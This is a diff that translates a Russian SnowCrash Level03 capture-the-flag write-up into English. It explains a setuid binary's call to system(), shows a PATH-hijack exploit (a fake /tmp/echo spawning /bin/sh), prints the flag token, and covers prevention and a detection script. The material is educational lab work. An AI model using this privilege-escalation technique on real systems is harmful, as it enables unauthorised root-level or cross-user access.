@@ -1,162 +1,180 @@
-Level03
-=======
+# Level03
 
-Flag
-----
+## Flag
 
 qi0maab88jeaj46qoumi7maus
 
-Discovery
----------
+## Discovery
 
-Основная задача, как и во всех упражнениях SnowCrash — выполнить `getflag` под нужным пользователем. Тогда команда вернёт токен, который используется для аутентификации.
+The main task, as in all SnowCrash exercises, is to execute `getflag` under the required user. Then the command will return the token, which is used for authentication.
 
-### Попытка вызвать getflag
+### Attempt to run getflag
 
-    level03@SnowCrash:~$ getflag
-    Check flag.Here is your token :
-    Nope there is no token here for you sorry. Try again :)
-    
+```
+level03@SnowCrash:~$ getflag
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+```
 
-### Проверка содержимого директории
+### Checking the directory contents
 
-В каталоге находится бинарный файл **level03**:
+The directory contains a binary file **level03**:
 
-    level03@SnowCrash:~$ ls -l
-    total 12
-    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
-    
+```
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+```
 
-Файл принадлежит пользователю **flag03**, группе **level03**, и имеет **setuid/setgid** биты.
+The file belongs to user **flag03**, group **level03**, and has **setuid/setgid** bits.
 
-Запуск показывает:
+Running it shows:
 
-    ./level03
-    Exploit me
-    
+```
+./level03
+Exploit me
+```
 
-### Анализ через nm
+### Analysis using nm
 
-Проверил, какие функции используются в бинарнике:
+Checked which functions are used in the binary:
 
-    nm level03
-    ...
-    080484a4 T main
-             U system@@GLIBC_2.0
-             U setresuid@@GLIBC_2.0
-             U setresgid@@GLIBC_2.0
-    ...
-    
+```
+nm level03
+...
+080484a4 T main
+         U system@@GLIBC_2.0
+         U setresuid@@GLIBC_2.0
+         U setresgid@@GLIBC_2.0
+...
+```
 
-В секции `main` есть вызов **system()**, что почти наверняка является уязвимостью.
+In the `main` section there is a call to **system()**, which is almost certainly a vulnerability.
 
-### Динамический анализ через ltrace
+### Dynamic analysis with ltrace
 
-Запустил программу:
+Ran the program:
 
-    level03@SnowCrash:~$ ltrace ./level03
-    getegid() = 2003
-    geteuid() = 2003
-    setresgid(2003, 2003, 2003) = 0
-    setresuid(2003, 2003, 2003) = 0
-    system("/usr/bin/env echo Exploit me"Exploit me
-    ...
-    
+```
+level03@SnowCrash:~$ ltrace ./level03
+getegid() = 2003
+geteuid() = 2003
+setresgid(2003, 2003, 2003) = 0
+setresuid(2003, 2003, 2003) = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+...
+```
 
-### Что это значит
+### What this means
 
-Программа явно сбрасывает свои UID/GID:
+The program explicitly resets its UID/GID:
 
-*   `setresgid(2003,2003,2003)` → OK
-*   `setresuid(2003,2003,2003)` → OK
+* `setresgid(2003,2003,2003)` → OK
+* `setresuid(2003,2003,2003)` → OK
 
-То есть она ДЕЛИБЕРАТНО сбрасывает привилегии на level03.
+Meaning it DELIBERATELY drops privileges to level03.
 
-Но ключевое — вызов:
+But the key part is the call:
 
-    system("/usr/bin/env echo Exploit me")
-    
+```
+system("/usr/bin/env echo Exploit me")
+```
 
-`/usr/bin/env` ищет `echo` в переменной окружения PATH.
+`/usr/bin/env` searches for `echo` in the PATH environment variable.
 
-### Причина уязвимости
+### Cause of the vulnerability
 
-Если изменить PATH так, чтобы первым был каталог с поддельным `echo`, программа выполнит наш скрипт с правами владельца файла **flag03**. Файл level03 принадлежит пользователю flag03 и имеет setuid‑бит (-rwsr-sr-x).
-    
-    chmod u+s → включает setuid (запуск от имени владельца).
-    chmod g+s → включает setgid (запуск от имени группы).
+If you modify PATH so that the first directory contains a fake `echo`, the program will execute our script with the permissions of the file owner **flag03**.
+The file level03 belongs to user flag03 and has the setuid bit (-rwsr-sr-x).
 
-В комбинации с обычными правами это даёт именно такую запись: -rwsr-sr-x. Это значит: когда ты, находясь под пользователем level03, запускаешь этот бинарник, ядро Linux автоматически выставляет эффективный UID процесса = владельцу файла, то есть flag03. Таким образом, процесс реально работает с правами flag03, даже если ты его вызвал как level03. Внутри программы есть вызовы setresuid(2003,2003,2003) и setresgid(2003,2003,2003). То есть автор программы сбрасывает свои права обратно на level03. Поэтому ltrace честно показывает, что текущий EUID/GID = 2003. Но у процесса всё равно остаётся сохранённый UID=3003 (flag03) благодаря setuid‑механизму. Это позволяет при вызове system() или других функций снова использовать права владельца файла.
+```
+chmod u+s → enables setuid (run as file owner).
+chmod g+s → enables setgid (run as group owner).
+```
 
-### Создание поддельного echo
+In combination with normal permissions, this produces exactly the string: `-rwsr-sr-x`.
 
-    echo '#!/bin/bash' > /tmp/echo
-    echo '/bin/sh' >> /tmp/echo
-    chmod +x /tmp/echo
-    export PATH=/tmp:$PATH
-    ./level03
-    
+This means: when you, as user level03, run this binary, the Linux kernel automatically sets the effective UID of the process to the file owner — flag03.
+Thus, the process actually runs with the rights of flag03, even if you executed it as level03.
 
-### Получение флага
+Inside the program there are calls to setresuid(2003,2003,2003) and setresgid(2003,2003,2003).
+Meaning the program’s author resets privileges back to level03.
+So ltrace correctly shows that the current EUID/GID = 2003.
 
-    level03@SnowCrash:~$ ./level03 
-    $ getflag
-    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
-    
+But the process *still keeps* the saved UID=3003 (flag03) thanks to the setuid mechanism.
+This allows system() or other functions to again use the file owner's privileges.
 
-Use (Exploit)
--------------
+### Creating a fake echo
 
-Эксплойт основан на классической уязвимости: подмена системной команды через PATH в сочетании с setuid-бинарником.
+```
+echo '#!/bin/bash' > /tmp/echo
+echo '/bin/sh' >> /tmp/echo
+chmod +x /tmp/echo
+export PATH=/tmp:$PATH
+./level03
+```
 
-Хотя программа вызывает `setresuid(2003,...)` и сбрасывает привилегии, она всё равно была запущена ядром с эффективным UID=**flag03**, потому что имеет setuid-бит:
+### Obtaining the flag
 
-\-rwsr-sr-x 1 flag03 level03 ...
+```
+level03@SnowCrash:~$ ./level03 
+$ getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
 
-Системный вызов `system()` порождает новый процесс, который наследует сохранённые UID процесса, и под определёнными условиями запускается с правами владельца файла.
+## Use (Exploit)
 
-Поэтому поддельный `echo` выполняется от имени **flag03**.
+The exploit is based on a classic vulnerability: substituting a system command via PATH in combination with a setuid binary.
 
-Prevention
-----------
+Even though the program calls `setresuid(2003,...)` and drops privileges, it was still launched by the kernel with effective UID=**flag03**, because it has the setuid bit:
 
-### Ошибки уровня
+```
+-rwsr-sr-x 1 flag03 level03 ...
+```
 
-*   **Использование system()** — небезопасно, так как зависит от PATH и оболочки.
-*   **setuid‑бинарник вызывает system()** — классическая опасность.
-*   **Неполное сбрасывание привилегий** — даже вызвав setresuid, программа сохраняет saved UID.
+The system() call spawns a new process, which inherits the saved UID of the calling process, and under certain conditions runs with the file owner's privileges.
 
-### Как предотвратить
+Therefore, the fake `echo` runs as **flag03**.
 
-*   Заменить `system()` на `execve()` с абсолютным путём.
-*   Жёстко задавать PATH, очищать окружение перед вызовом внешних программ.
-*   Полностью сбрасывать привилегии: `setuid(getuid())` без сохранения setuid.
-*   Избегать setuid вообще, если можно.
+## Prevention
 
-Documentation
--------------
+### Level mistakes
 
-*   `man system`
-*   `man execve`
-*   `man setuid`
-*   `man capabilities`
-*   Reverse engineering basics — https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d
+* **Using system()** — unsafe because it depends on PATH and the shell.
+* **setuid binary calls system()** — classic danger.
+* **Incomplete privilege dropping** — even after setresuid, the program retains the saved UID.
 
-Automatic Testing
------------------
+### How to prevent
 
-Базовый тест, проверяющий наличие вызовов system() в setuid-бинарниках:
+* Replace `system()` with `execve()` with an absolute path.
+* Hardcode PATH, clear the environment before invoking external programs.
+* Completely drop privileges: `setuid(getuid())` without keeping setuid.
+* Avoid setuid entirely when possible.
 
-    #!/bin/bash
-    
-    FILE=./level03
-    
-    if [[ -u $FILE ]]; then
-      echo "Warning: setuid binary detected"
-      if strings "$FILE" | grep -q "system("; then
-        echo "Danger: setuid binary uses system()"
-        exit 1
-      fi
-    fi
-    
-    echo "OK"
+## Documentation
+
+* `man system`
+* `man execve`
+* `man setuid`
+* `man capabilities`
+* Reverse engineering basics — [https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d](https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d)
+
+## Automatic Testing
+
+A basic test that checks for system() calls in setuid binaries:
+
+```bash
+#!/bin/bash
+
+FILE=./level03
+
+if [[ -u $FILE ]]; then
+  echo "Warning: setuid binary detected"
+  if strings "$FILE" | grep -q "system("; then
+    echo "Danger: setuid binary uses system()"
+    exit 1
+  fi
+fi
+
+echo "OK"
+```
